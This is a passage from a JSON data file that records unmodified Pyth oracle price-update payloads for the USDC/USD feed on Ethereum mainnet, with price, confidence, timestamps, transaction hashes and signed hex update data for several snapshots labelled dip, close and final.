7b20c76e9d8004b686ded3da800cc9f4f3dda7672f7a1cb1fc928f5cde4691f2d1b5136c32f94707ec8437d7384b567005248c2727e0bbc4d190055002b89b9dc8fdf9f34709a5b106b472f0f39bb6ca9ce04b0fd7f2e971688e2e53b0000000005f3925e0000000000002bc2fffffff8000000006aeae5a3000000006aeae5a20000000005f39b0a0000000000002e450cc843809a9f19815f68ef83c5f48e5de0188ac453e37e49e2d701e52f41a6ae24d5994adc035957edbe49c52d64e869ce49a45216c51e692bbb88bd026816331ceb8175b44bb02159cf9e02d0280fa8e3dec21fea2ffa6f4d1c45c34c77d9ae342481ae99241b9d940079f2d3493c5d4b8be3fb5238c7f2f12186febaf20faae880e2e223ecb20325387145b3054b8e64bd4262040b50169f4931543139376b030425b2ac1ddcc608cde29307375034a4bd19e131cf4b27b20c76e9d8004b686ded3da800cc9f4f3dda7672f7a1cb1fc928f5cde4691f2d1b5136c32f94707ec8437d7384b567005248c2727e0bbc4d19"
      ]
    },
    "dip": {
      "price": 99980957,
      "conf": 4993,
      "publish": 1793780919,
      "prev": 1793780918,
      "tx": "0x54368d6e52539c289e22887f9a568494f33af6a0a0d38c5d0883c0d665d6fdfa",
      "updateData": [
        "0x504e415501000000012401000000010300a4e68e5ceaef78c29ffe9e3185160c51994a0f395544cb3523ea8f0090638efa4eb66885eda068068af134fe7eab02733f9df2c2f9d8610f91a5056dc17d3680000102abf6dd159668eb936ad438162f2c18abe6573d42bf9925806486ac1a4579a00c942b774daf406ed51d54b7e709c6bdb7fed1f176d7c4a7f77f0955fb8cc09b00045357c596b6d3a737acecee7a63ddafce6adc9650556b1cfbe20e31febafb070a4fc7a4ca4e0dccd9ceeb786020ac7c3007036548919a1cdd88faa551b57aacef016aeaecb700000000001a507974686e6574507974686e6574507974686e6574507974686e657450797468000000085a5a7e4c004155575600000000085a5a7e4c0000000023cfa1af24690c6dd64cc59cc6afaf807c66467b03005500ff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace00000035e9de56f20000000010fdd58efffffff8000000006aeaecb7000000006aeaecb60000003597f18548000000000fb2278f0c43538fccbda4ea53b7bf12d0f786c65536930ba14200ecdf351bc466c01ec516f4d2cb28e256d3b89b790c353f4e3cdb168ca078a85af801f3efbf4acb0e65d431f9fcb7ad4ef0801c36e9ee3465118955c271674e1149b2c218e0fe02c961f1e96f16c5c66e40c4d9d389c42620efe88032244d61abc079f33b55ba38c480a651c3b7ef2c262a23dff9696df73a77124f93dff5e061b2cef47ab9b32dee194fefd97ac4f8d5e69070a409f75afcdc527bb22f0db8ee810692d5c1567aef5e9b198ba4fa3bb739cdbdab70832a68496bc69c28192e56d66e7b9df1a2ec127443e53e81adb7be2e9d95bdff4de76ce2c7005500eaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a0000000005f5969d0000000000001381fffffff8000000006aeaecb7000000006aeaecb60000000005f5969b00000000000018030ccc038347020b53426f689050fd0fb5ae62660be6fa447d9e39aa1f1f72f87369b1a246ed4209f65ea464f08a05cd49c506a0ac202920a51007594354cb0e65d431f9fcb7ad4ef0801c36e9ee3465118955c271674e1149b2c218e0fe02c961f1e96f16c5c66e40c4d9d389c42620efe88032244d61abc079f33b55ba38c480a651c3b7ef2c262a23dff9696df73a77124f93dff5e061b2cef47ab9b32dee194fefd97ac4f8d5e69070a409f75afcdc527bb22f0db8ee810692d5c1567aef5e9b198ba4fa3bb739cdbdab70832a68496bc69c28192e56d66e7b9df1a2ec127443e53e81adb7be2e9d95bdff4de76ce2c70055002b89b9dc8fdf9f34709a5b106b472f0f39bb6ca9ce04b0fd7f2e971688e2e53b0000000005f3899e0000000000006563fffffff8000000006aeaecb7000000006aeaecb60000000005f3966000000000000031500c62db63b9d8da9e62900df879ae87c5a17a247bb7fa447d9e39aa1f1f72f87369b1a246ed4209f65ea464f08a05cd49c506a0ac202920a51007594354cb0e65d431f9fcb7ad4ef0801c36e9ee3465118955c271674e1149b2c218e0fe02c961f1e96f16c5c66e40c4d9d389c42620efe88032244d61abc079f33b55ba38c480a651c3b7ef2c262a23dff9696df73a77124f93dff5e061b2cef47ab9b32dee194fefd97ac4f8d5e69070a409f75afcdc527bb22f0db8ee810692d5c1567aef5e9b198ba4fa3bb739cdbdab70832a68496bc69c28192e56d66e7b9df1a2ec127443e53e81adb7be2e9d95bdff4de76ce2c7"
      ]
    },
    "close": {
      "price": 99977002,
      "conf": 4334,
      "publish": 1793782756,
      "prev": 1793782755,
      "tx": "0xdc678346ae651cd73055ac8f8dbaf42a0e111853f8b71bd1c81833dc27df0dae",
      "updateData": [
        "0x504e41550100000001240100000001030133bbae608dd5c0d88c365655bbc12c5a940931e047658ca829556944adbdb37a2f25a71f8453d1cdc95ead3126eb54e87dbb98a4d8f729ccc0f5ea84509def2001026556661ad7774b17f3047df5335ead243e08fb270701d9efd0cea1eaeed156cf781ac02139b019ca2302f5f286228ebe2f383d76bf97f5bd5f7ffb852ebff6600004f43e2edbe522f4ee6fa6404cbf0aea6c241fb012931db8089d01c979298f764f1c2aeb0bb52e699fc77074fe50a98140a529e8c136fade58281af4cef79069d0006aeaf3e400000000001a507974686e6574507974686e6574507974686e6574507974686e657450797468000000085a5b0dd0004155575600000000085a5b0dd00000000022ad8b3e309b9939fd0a90abf54d456bc66f5ca003005500ff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace00000035fadb646f000000000feae0d1fffffff8000000006aeaf3e4000000006aeaf3e300000035c6fd8c60000000000ff6ef6c0ca9c31786e79a760bee0b9d1f1922d4cca80e06f583fd1b5ca30246457b22a7380a202cfd4c7c0d7b16c106946b005d7b1386c1347cd06c5aa0fe69c1f84718b64c43696f4b27d6c63676f639aedeeb36bde14d5413cd2001df30c8bf9844e7d4738051ce032a95141d909a164d39d9aad71d5bed216ae2f036a88f6e71e77b6829b6ced9e0cfe64eb629f9b09989238cffc5ebd2bbd653197fdc14db91611e06c490c43f5263139aed27af17df79566bbfcea1ce9fa7f910898c6e81803005ac0bdf0919eafaf007bfe03193229a2a8f289b91edd2914ca633c482dde50c7190c39d3dafab9d5c7691aa23af2f32d15c005500eaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a0000000005f5872a00000000000010eefffffff8000000006aeaf3e4000000006aeaf3e30000000005f5919f00000000000013cd0c54cf81583ff51be5b4cfaeb118c9f3ffcdb0f8c11a7d507e09e9b6478f06a68bce6ae3f20c85c6cc4b6c2b1625518ee1249a1ea89118400fab811d0ff84718b64c43696f4b27d6c63676f639aedeeb36bde14d5413cd2001df30c8bf9844e7d4738051ce032a95141d909a164d39d9aad71d5bed216ae2f036a88f6e71e77b6829b6ced9e0cfe64eb629f9b09989238cffc5ebd2bbd653197fdc14db91611e06c490c43f5263139aed27af17df79566bbfcea1ce9fa7f910898c6e81803005ac0bdf0919eafaf007bfe03193229a2a8f289b91edd2914ca633c482dde50c7190c39d3dafab9d5c7691aa23af2f32d15c0055002b89b9dc8fdf9f34709a5b106b472f0f39bb6ca9ce04b0fd7f2e971688e2e53b0000000005f3c31d00000000000058c2fffffff8000000006aeaf3e4000000006aeaf3e30000000005f399cd00000000000038870c3e1e3005cdf56d91faaca325815f6504d97c13b61a7d507e09e9b6478f06a68bce6ae3f20c85c6cc4b6c2b1625518ee1249a1ea89118400fab811d0ff84718b64c43696f4b27d6c63676f639aedeeb36bde14d5413cd2001df30c8bf9844e7d4738051ce032a95141d909a164d39d9aad71d5bed216ae2f036a88f6e71e77b6829b6ced9e0cfe64eb629f9b09989238cffc5ebd2bbd653197fdc14db91611e06c490c43f5263139aed27af17df79566bbfcea1ce9fa7f910898c6e81803005ac0bdf0919eafaf007bfe03193229a2a8f289b91edd2914ca633c482dde50c7190c39d3dafab9d5c7691aa23af2f32d15c"
      ]
    },
    "final": {
      "price": 99976668,
      "conf": 12200,
      "publish": 1793786768,
      "prev": 1793786767,
      "tx": "0xfe5e089bab064c38677e6a905a980d2eed6ee188533adb1bce88618000027e9a",
      "updateData": [
        "0x504e415501000000012401000000010301210717d4057db38f221c291a98439efdb843819ab50d0623544989d093bbfbb75fa8685e88c61aa73adfd55b29cde5ba708216560e6abc2cc1672fe8357c19a20102842f54a8355b42748b070946c7a6d3a556546527625eb982204ebc872578c6ef7ebfef2f26ba4581c822ae7fe6ced8e267c3b6e268f5a9af5446d805f7653c69010449e042837729e8b74e0ce78d1ccca77e94ff8f2970a3b2c6ab704960907e6ba221999d5640aaba29bb90bc68beeb024a68cff466b7278be0d00781f3553b01d0016aeb039000000000001a507974686e6574507974686e6574507974686e6574507974686e657450797468000000085a5c4740004155575600000000085a5c474000000000c7979380b1b8520499017a0eb3e97779e2b3cc5c02005500eaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a0000000005f585dc0000000000002fa8fffffff8000000006aeb0390000000006aeb038f0000000005f5907f000000000000175d0c6a16689d821e9ead8751ba654827a8f14951de858e3a301b455f959221b6320f1becadbc7b467e2c92891ed8c33e2cd4bc1c8e4319333c45a6b3b372542e49d1265bf10cd5d2c64aeed3ca739f1071dfd19ba12d2e9a2e5340ee330ee97f725109c58b6f322a003197720f3bc071637c6f67767b8a60b77e3cec566d3505fb428737ff13bf0a4e6a627d5aeb710c8d7112bf36d0f277d911195d4624296e043ddfae7128723f32cd0da6434c553bd5e7065ebbf20abca3019e6556b7abe39d0ff129a718e3a308922f9ec5c86f83812ec9f9b8dc16a1da0987b30362de2b454fc295d7305b7357f5178312eefb662ed40055002b89b9dc8fdf9f34709a5b106b472f0f39bb6ca9ce04b0fd7f2e971688e2e53b0000000005f39139000000000000406ffffffff8000000006aeb0390000000006aeb038f0000000005f3a6f800000000000037210c0e21df8ecbfaca61677e30a934ee42069a49e6728e3a301b455f959221b6320f1becadbc7b467e2c92891ed8c33e2cd4bc1c8e4319333c45a6b3b372542e49d1265bf10cd5d2c64aeed3ca739f1071dfd19ba12d2e9a2e5340ee330ee97f725109c58b6f322a003197720f3bc071637c6f67767b8a60b77e3cec566d3505fb428737ff13bf0a4e6a627d5aeb710c8d7112bf36d0f277d911195d4624296e043ddfae7128723f32cd0da6434c553bd5e7065ebbf20abca3019e6556b7abe39d0ff129a718e3a308922f9ec5c86f83812ec9f9b8dc16a1da0987b30362de2b454fc295d7305b7357f5178312eefb662ed4"
      ]
    }
  },
  "description": "Unmodified Ethereum mainnet Pyth updatePriceFeeds(bytes[]) payloads for Crypto.USDC/USD 0xeaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a. Each print's prevPublishTime is one second before publishTime. Captured from public transaction calldata. No price byte was edited.",
  "pythEthereum": "0x4305FB66699C3B2702D4d05CF36551390A4c69C6",
  "feed": "0xeaa020c61cc479712813461ce153894a96a6c00b21ed0cfc2798d1f9a9e9c94a"
}
```
